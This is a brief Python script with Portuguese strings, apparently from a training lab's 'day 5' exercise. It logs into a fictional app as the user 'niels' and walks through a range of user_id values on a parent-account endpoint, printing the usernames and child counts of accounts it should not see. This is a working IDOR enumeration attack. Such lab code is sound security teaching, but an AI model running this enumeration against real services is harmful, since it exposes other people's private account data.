"""Enumera IDs de pais no aplicativo fictício do dia 5."""

import argparse
import getpass

import requests


parser = argparse.ArgumentParser(description=__doc__)
parser.add_argument('--ip', required=True, help='IP da Lab Machine')
parser.add_argument('--inicio', type=int, default=1)
parser.add_argument('--fim', type=int, default=40)
args = parser.parse_args()

if args.inicio < 1 or args.fim < args.inicio:
    parser.error('Use um intervalo positivo com --fim >= --inicio.')

base = f'http://{args.ip}/api'
sessao = requests.Session()
senha = getpass.getpass('Senha de niels mostrada na sala: ')
login = sessao.post(
    base + '/auth/login',
    data={'username': 'niels', 'password': senha},
    timeout=10,
)
login.raise_for_status()
sessao.headers['Authorization'] = 'Bearer ' + login.json()['access_token']

for user_id in range(args.inicio, args.fim + 1):
    resposta = sessao.get(
        base + '/parents/view_accountinfo',
        params={'user_id': user_id},
        timeout=10,
    )
    if not resposta.ok:
        print(user_id, resposta.status_code)
        continue
    conta = resposta.json()
    print(user_id, conta.get('username'), len(conta.get('children', [])))
